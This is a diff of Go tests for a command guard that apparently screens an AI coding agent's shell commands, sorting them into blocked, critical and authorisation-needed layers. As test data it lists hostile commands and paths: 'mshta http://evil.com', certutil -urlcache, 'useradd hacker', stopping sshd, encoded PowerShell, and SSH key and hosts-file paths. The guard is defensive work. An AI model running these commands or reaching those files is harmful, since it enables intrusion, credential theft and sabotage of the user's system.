@@ -12,15 +12,29 @@ func TestAlwaysBlocked(t *testing.T) {
 		expect bool
 	}{
 		{"shred blocked", []string{"shred", "file.txt"}, true},
-		{"kill blocked", []string{"kill", "1234"}, true},
 		{"sudo blocked", []string{"sudo", "ls"}, true},
-		{"npx blocked", []string{"npx", "create-react-app"}, true},
 		{"truncate blocked", []string{"truncate", "-s", "0", "file"}, true},
+		// LOLBins
+		{"certutil blocked", []string{"certutil", "-urlcache"}, true},
+		{"mshta blocked", []string{"mshta", "http://evil.com"}, true},
+		{"rundll32 blocked", []string{"rundll32", "shell32.dll"}, true},
+		// System config
+		{"netsh blocked", []string{"netsh", "advfirewall"}, true},
+		{"shutdown blocked", []string{"shutdown", "/s"}, true},
+		// Linux system
+		{"systemctl blocked", []string{"systemctl", "stop", "sshd"}, true},
+		{"iptables blocked", []string{"iptables", "-A"}, true},
+		{"useradd blocked", []string{"useradd", "hacker"}, true},
+		// Moved to L2 (not in L1 anymore)
+		{"kill (now L2)", []string{"kill", "1234"}, false},
+		{"npx (now L2)", []string{"npx", "create-react-app"}, false},
+		{"chmod (now L2)", []string{"chmod", "+x", "script.sh"}, false},
+		// Safe commands
 		{"ls allowed", []string{"ls", "-la"}, false},
 		{"git status allowed", []string{"git", "status"}, false},
 		{"cat allowed", []string{"cat", "file.txt"}, false},
 		{"echo allowed", []string{"echo", "hello"}, false},
-		// net user/localgroup moved from Layer 2 to Layer 1
+		// net user/localgroup in Layer 1
 		{"net user blocked", []string{"net", "user", "admin"}, true},
 		{"net localgroup blocked", []string{"net", "localgroup", "admins"}, true},
 		{"net view allowed", []string{"net", "view"}, false},
@@ -42,10 +56,7 @@ func TestDangerousOpsAuth(t *testing.T) {
 		parts  []string
 		expect bool
 	}{
-		// git dangerous operations
-		{"git push force", []string{"git", "push", "--force"}, true},
-		{"git push -f", []string{"git", "push", "-f"}, true},
-		{"git push ok", []string{"git", "push"}, false},
+		// git local-destructive (still L3)
 		{"git reset hard", []string{"git", "reset", "--hard"}, true},
 		{"git reset soft", []string{"git", "reset", "--soft"}, false},
 		{"git checkout --", []string{"git", "checkout", "--", "."}, true},
@@ -54,25 +65,101 @@ func TestDangerousOpsAuth(t *testing.T) {
 		{"git clean -n", []string{"git", "clean", "-n"}, false},
 		{"git branch -D", []string{"git", "branch", "-D", "feature"}, true},
 		{"git branch list", []string{"git", "branch"}, false},
-		// Package publish / uninstall
-		{"npm publish", []string{"npm", "publish"}, true},
+		// Elevated to L2 (not in L3 anymore)
+		{"git push force (now L2)", []string{"git", "push", "--force"}, false},
+		{"npm publish (now L2)", []string{"npm", "publish"}, false},
+		{"docker volume rm (now L2)", []string{"docker", "volume", "rm", "vol"}, false},
+		{"docker system prune (now L2)", []string{"docker", "system", "prune"}, false},
+		{"docker compose down -v (now L2)", []string{"docker", "compose", "down", "-v"}, false},
+		// Still in L3
 		{"npm install (safe)", []string{"npm", "install", "pkg"}, false},
 		{"pip uninstall", []string{"pip", "uninstall", "pkg"}, true},
 		{"gem uninstall", []string{"gem", "uninstall", "pkg"}, true},
-		// Docker destructive
-		{"docker volume rm", []string{"docker", "volume", "rm", "vol"}, true},
-		{"docker system prune", []string{"docker", "system", "prune"}, true},
-		{"docker compose down -v", []string{"docker", "compose", "down", "-v"}, true},
 		{"docker ps (safe)", []string{"docker", "ps"}, false},
-		// PowerShell obfuscated
 		{"powershell enc", []string{"powershell", "-EncodedCommand", "abc"}, true},
 		{"powershell normal", []string{"powershell", "-Command", "ls"}, false},
-		// net user NOT here (moved to Layer 1)
-		{"net user (not here)", []string{"net", "user", "admin"}, false},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			hit, _ := checkDangerousOpsAuth(tt.parts, projectDir)
+			if hit != tt.expect {
+				t.Errorf("got %v, want %v", hit, tt.expect)
+			}
+		})
+	}
+}
+
+func TestCriticalCommands(t *testing.T) {
+	tests := []struct {
+		name   string
+		parts  []string
+		expect bool
+	}{
+		{"npx", []string{"npx", "create-react-app"}, true},
+		{"kill", []string{"kill", "1234"}, true},
+		{"pkill", []string{"pkill", "node"}, true},
+		{"killall", []string{"killall", "python"}, true},
+		{"taskkill", []string{"taskkill", "/PID", "1234"}, true},
+		{"chmod", []string{"chmod", "+x", "script.sh"}, true},
+		{"npm (safe)", []string{"npm", "install"}, false},
+		{"git (safe)", []string{"git", "status"}, false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			hit, _ := checkCriticalCommands(tt.parts)
+			if hit != tt.expect {
+				t.Errorf("got %v, want %v", hit, tt.expect)
+			}
+		})
+	}
+}
+
+func TestCriticalOps(t *testing.T) {
+	tests := []struct {
+		name   string
+		parts  []string
+		expect bool
+	}{
+		{"git push force", []string{"git", "push", "--force"}, true},
+		{"git push -f", []string{"git", "push", "-f"}, true},
+		{"git push ok", []string{"git", "push"}, false},
+		{"npm publish", []string{"npm", "publish"}, true},
+		{"pnpm publish", []string{"pnpm", "publish"}, true},
+		{"docker volume rm", []string{"docker", "volume", "rm", "vol"}, true},
+		{"docker system prune", []string{"docker", "system", "prune"}, true},
+		{"docker compose down -v", []string{"docker", "compose", "down", "-v"}, true},
+		{"docker ps (safe)", []string{"docker", "ps"}, false},
+		{"docker-compose down -v", []string{"docker-compose", "down", "-v"}, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			hit, _ := checkCriticalOps(tt.parts)
+			if hit != tt.expect {
+				t.Errorf("got %v, want %v", hit, tt.expect)
+			}
+		})
+	}
+}
+
+func TestCriticalPath(t *testing.T) {
+	cfg := &GuardConfig{}
+	tests := []struct {
+		name   string
+		path   string
+		expect bool
+	}{
+		{"guard.exe", "C:/Users/king/.claude/hooks/guard.exe", true},
+		{"settings.json", "C:/Users/king/.claude/settings.json", true},
+		{"ssh key", "C:/Users/king/.ssh/id_rsa", true},
+		{"gitconfig", "C:/Users/king/.gitconfig", true},
+		{"bashrc", "C:/Users/king/.bashrc", true},
+		{"hosts", "C:/Windows/System32/drivers/etc/hosts", true},
+		{"project file (safe)", "D:/AI-workspace/LastGuardian/main.go", false},
+		{"random file (safe)", "D:/projects/app/src/index.ts", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			hit, _ := checkCriticalPath(tt.path, cfg)
 			if hit != tt.expect {
 				t.Errorf("got %v, want %v", hit, tt.expect)
 			}
